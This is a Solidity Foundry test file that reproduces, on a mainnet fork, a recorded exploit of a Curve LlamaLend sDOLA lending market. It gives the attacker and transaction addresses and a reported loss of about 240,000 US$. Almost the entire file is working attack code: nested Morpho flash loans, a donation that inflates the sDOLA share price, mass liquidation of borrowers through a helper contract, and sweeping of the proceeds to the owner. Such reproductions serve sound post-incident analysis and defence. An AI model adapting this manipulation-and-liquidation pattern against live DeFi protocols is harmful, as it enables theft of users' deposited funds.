// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~240,000 US$
// Attacker : 0x33a0aab2642c78729873786e5903cc30f9a94be2
// Attack Contract : 0xd8E8544E0c808641b9b89dfB285b5655BD5B6982
// Attack Contract2 : 0xC6C2fcdf688BAeB7b03D9D9C088c183dbB499ac0
// Attack Tx : 0xb93506af8f1a39f6a31e2d34f5f6a262c2799fef6e338640f42ab8737ed3d8a4

// @Analysis
// Twitter Guy : https://x.com/yieldsandmore/status/2028368378457362629

contract Curve_LlamaLend_exp is BaseTestWithBalanceLog {
    AttackContract internal attack;
    IWETH internal constant weth = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    IERC20 internal constant DOLA = IERC20(address(0x865377367054516e17014CcdED1e7d814EDC9ce4));

    function setUp() public {
        vm.createSelectFork("mainnet", bytes32(0xb93506af8f1a39f6a31e2d34f5f6a262c2799fef6e338640f42ab8737ed3d8a4)); //blocknumber 24_566_937
        attack = new AttackContract();
    }

    function testExploit() public {
        attack.start();
        attack.end();
        emit log_named_decimal_uint("DOLA Balance", DOLA.balanceOf(address(this)), 18);
        emit log_named_decimal_uint("WETH Balance", weth.balanceOf(address(this)), 18);
    }
}

contract AttackContract {
    address internal owner;
    bool internal FlashloanUsed;

    IMorphoBuleFlashLoan internal constant morpho = IMorphoBuleFlashLoan(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));

    IUSDC internal constant usdc = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IWETH internal constant weth = IWETH(payable(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)));
    IERC20 internal constant crvUSD = IERC20(address(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E));
    IERC4626 internal constant sDOLA = IERC4626(address(0xb45ad160634c528Cc3D2926d9807104FA3157305));
    IERC20 internal constant DOLA = IERC20(address(0x865377367054516e17014CcdED1e7d814EDC9ce4));
    IERC20 internal constant alUSD = IERC20(address(0xBC6DA0FE9aD5f3b0d58160288917AA56653660E9));
    IYearnV3Vault internal constant scrvUSD = IYearnV3Vault(address(0x0655977FEb2f289A4aB78af67BAB0d17aAb84367));

    ILLAMMAExchange internal constant LLAMMA_CRV_USD_AMM = ILLAMMAExchange(address(0x0079885E248B572CdC4559A8B156745e2d8EA1f7));
    IcrvController internal constant crvUSD_Controller = IcrvController(address(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86));
    IcrvController internal constant crvUSD_Controller_2 = IcrvController(address(0xA920De414eA4Ab66b97dA1bFE9e6EcA7d4219635));
    IDolaSavings internal constant DOLA_SAVINGS = IDolaSavings(address(0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4));
    IcurveStableSwap internal constant alUSD_sDOLA = IcurveStableSwap(address(0x460638e6F7605B866736e38045C0DE8294d7D87f));
    IcurveStableSwap internal constant SAVE_DOLA = IcurveStableSwap(address(0x76A962BA6770068bCF454D34dDE17175611e6637));
    IcurveStableSwap internal constant alUSD_FRAXB3CRV_F = IcurveStableSwap(address(0xB30dA2376F63De30b42dC055C93fa474F31330A5));
    IUniswapV2Router internal constant router = IUniswapV2Router(payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)));

    constructor() {
        owner = msg.sender;
        usdc.approve(address(alUSD_FRAXB3CRV_F), type(uint256).max);
        weth.approve(address(crvUSD_Controller_2), type(uint256).max);
        crvUSD.approve(address(scrvUSD), type(uint256).max);
        crvUSD.approve(address(crvUSD_Controller_2), type(uint256).max);
        alUSD.approve(address(alUSD_FRAXB3CRV_F), type(uint256).max);
        usdc.approve(address(router), type(uint256).max);
    }

    function start() external {
        morpho.flashLoan(address(usdc), 10_000_000_000_000, "");
    }

    function onMorphoFlashLoan(
        uint256,
        bytes calldata
    ) external {
        uint256 morphoWethAmount = weth.balanceOf(address(morpho));

        if (!FlashloanUsed) {
            FlashloanUsed = true;
            morpho.flashLoan(address(weth), morphoWethAmount, "");
            usdc.approve(address(morpho), 10_000_000_000_000);
            return;
        }

        crvUSD.approve(address(LLAMMA_CRV_USD_AMM), type(uint256).max);
        sDOLA.approve(address(LLAMMA_CRV_USD_AMM), type(uint256).max);
        sDOLA.approve(address(crvUSD_Controller), type(uint256).max);
        crvUSD.approve(address(crvUSD_Controller), type(uint256).max);
        DOLA.approve(address(sDOLA), type(uint256).max);
        DOLA.approve(address(DOLA_SAVINGS), type(uint256).max);
        alUSD.approve(address(alUSD_sDOLA), type(uint256).max);
        scrvUSD.approve(address(SAVE_DOLA), type(uint256).max);
        sDOLA.approve(address(alUSD_sDOLA), type(uint256).max);
        sDOLA.approve(address(SAVE_DOLA), type(uint256).max);

        alUSD_FRAXB3CRV_F.exchange_underlying(2, 0, 7_000_000_000_000, 1);
        alUSD_sDOLA.exchange(1, 0, 650_000_000_000_000_000_000_000, 1);

        uint256 wethAmount = weth.balanceOf(address(this));
        weth.withdraw(wethAmount);
        crvUSD_Controller_2.create_loan{value: wethAmount}(wethAmount, 25_000_000_000_000_000_000_000_000, 4);

        scrvUSD.deposit(7_000_000_000_000_000_000_000_000, address(this));
        SAVE_DOLA.exchange(0, 1, 370_000_000_000_000_000_000_000, 1);
        LLAMMA_CRV_USD_AMM.exchange(0, 1, 16_000_000_000_000_000_000_000_000, 1);

        uint256 sDolaAmount = sDOLA.balanceOf(address(this));
        sDOLA.redeem(sDolaAmount, address(this), address(this));
        DOLA_SAVINGS.stake(190_777_474_808_103_397_780_234, address(sDOLA));
        sDOLA.convertToAssets(1e18);

        LLAMMA_CRV_USD_AMM.exchange(0, 1, 0, 1);
        AttackContract2 liquidator = new AttackContract2();
        uint256 crvUsdAmount = crvUSD.balanceOf(address(this));
        crvUSD.transfer(address(liquidator), crvUsdAmount);
        liquidator.liquidateAllUsers();
        sDOLA.mint(1_300_000_000_000_000_000_000_000, address(this));

        uint256 dxAmount = alUSD_sDOLA.get_dx(0, 1, 685_000_000_000_000_000_000_000);
        alUSD_sDOLA.exchange(0, 1, dxAmount, 1);
        uint256 alUsdAmount = alUSD.balanceOf(address(this));
        alUSD_FRAXB3CRV_F.exchange_underlying(0, 2, alUsdAmount, 1);

        dxAmount = SAVE_DOLA.get_dx(1, 0, 372_000_000_000_000_000_000_000);
        SAVE_DOLA.exchange(1, 0, dxAmount, 1);

        uint256 scrvUsdAmount = scrvUSD.balanceOf(address(this));
        scrvUSD.redeem(scrvUsdAmount, address(this), address(this));

        sDolaAmount = sDOLA.balanceOf(address(this));
        sDOLA.redeem(sDolaAmount, address(this), address(this));
        LLAMMA_CRV_USD_AMM.exchange(0, 1, 0, 1);
        uint256 collateralAmount = crvUSD_Controller.min_collateral(10_904_020_804_458_172_792_365_906, 4);

        sDOLA.mint(collateralAmount, address(this));
        crvUSD_Controller.create_loan(collateralAmount, 10_904_020_804_458_172_792_365_806, 4);
        crvUSD_Controller_2.repay(50_000_000_000_000_000_000_000_000);

        address[] memory path = new address[](2);
        path[0] = address(usdc);
        path[1] = address(weth);

        router.swapExactTokensForTokens(13_241_509_653, 1, path, address(this), 1_772_420_411);

        (bool success,) = address(weth).call{value: address(this).balance}("");
        require(success, "failed");

        weth.approve(address(morpho), 15_986_107_781_121_575_327_546);
    }

    function end() public {
        DOLA.transfer(owner, DOLA.balanceOf(address(this)));
        weth.transfer(owner, weth.balanceOf(address(this)));
    }

    receive() external payable {}
}

contract AttackContract2 {
    address internal owner;
    IcrvController internal constant crvUSD_Controller = IcrvController(address(0xaD444663c6C92B497225c6cE65feE2E7F78BFb86));
    IERC20 internal constant crvUSD = IERC20(address(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E));
    IERC20 internal constant DOLA = IERC20(address(0x865377367054516e17014CcdED1e7d814EDC9ce4));

    Position[] public usersToLiquidateData;

    constructor() {
        owner = msg.sender;
        crvUSD.approve(address(crvUSD_Controller), type(uint256).max);
    }

    function liquidateAllUsers() external {
        Position[] memory positions = crvUSD_Controller.users_to_liquidate();
        uint256 storedLenBefore = usersToLiquidateData.length;

        for (uint256 i = 0; i < positions.length; i++) {
            usersToLiquidateData.push(positions[i]);
        }

        for (uint256 i = 0; i < usersToLiquidateData.length; i++) {
            crvUSD_Controller.liquidate(usersToLiquidateData[i].user, 0);
        }

        uint256 amount = crvUSD.balanceOf(address(this));
        crvUSD.transfer(owner, amount);
        amount = DOLA.balanceOf(address(this));
        DOLA.transfer(owner, amount);
    }
}

struct Position {
    address user;
    uint256 x;
    uint256 y;
    uint256 debt;
    int256 health;
}

interface IcrvController {
    function create_loan(
        uint256 collateral,
        uint256 debt,
        uint256 nBands
    ) external payable;

    function users_to_liquidate() external returns (Position[] memory);

    function liquidate(
        address user,
        uint256 min_x
    ) external;

    function min_collateral(
        uint256 debt,
        uint256 nBands
    ) external returns (uint256);

    function repay(
        uint256 d_debt
    ) external;
}

interface IcurveStableSwap {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external;

    function exchange_underlying(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external;

    function get_dx(
        int128 i,
        int128 j,
        uint256 dy
    ) external returns (uint256);
}

interface IYearnV3Vault {
    function deposit(
        uint256 assets,
        address receiver
    ) external;

    function approve(
        address spender,
        uint256 amount
    ) external;

    function balanceOf(
        address account
    ) external returns (uint256);

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external;
}

interface ILLAMMAExchange {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 in_amount,
        uint256 min_amount
    ) external returns (uint256[2] memory);
}

interface IDolaSavings {
    function stake(
        uint256 amount,
        address recipient
    ) external;
}
